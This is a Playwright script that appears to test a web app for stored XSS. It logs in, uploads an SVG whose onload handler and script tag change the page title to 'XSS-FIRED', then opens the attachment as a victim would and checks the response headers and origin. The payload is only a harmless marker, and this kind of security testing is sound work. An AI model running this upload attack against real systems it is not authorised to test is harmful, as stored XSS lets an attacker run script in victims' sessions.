import { launch, login, base } from "./_lib.mjs";
import fs from "node:fs";
const { browser, page } = await launch();
await login(page);
const dir = "tmp/uploads-probe";
fs.mkdirSync(dir, { recursive: true });
// A genuine SVG. No MIME lying needed: .svg maps to image/svg+xml, which is served inline.
const svg = `${dir}/probe.svg`;
fs.writeFileSync(svg, `<svg xmlns="http://www.w3.org/2000/svg" onload="document.title='XSS-FIRED'"><script>document.title='XSS-FIRED'</script></svg>`);
await page.goto(base + "/contacts");
const href = await page.locator('a[href*="/contacts/"]').first().getAttribute("href");
await page.goto(base + href);
await page.click("[data-tab=files]").catch(()=>{});
await page.locator('input[type=file]').first().setInputFiles(svg);
const sub = page.locator("form:has(input[type=file]) button[type=submit]").first();
if (await sub.count()) await sub.click();
await page.waitForTimeout(2000);
// Find the attachment id and open it directly, as a victim clicking the file would.
const link = await page.locator('a[href*="/files/"]').last().getAttribute("href").catch(()=>null);
console.log("file link:", link);
if (link) {
  const res = await page.goto(base + link, { waitUntil: "domcontentloaded" });
  console.log("Content-Type:", res.headers()["content-type"]);
  console.log("Content-Disposition:", res.headers()["content-disposition"] || "(none)");
  await page.waitForTimeout(800);
  console.log("document.title after load:", await page.title());
  console.log("ORIGIN:", await page.evaluate(() => location.origin));
}
await browser.close();
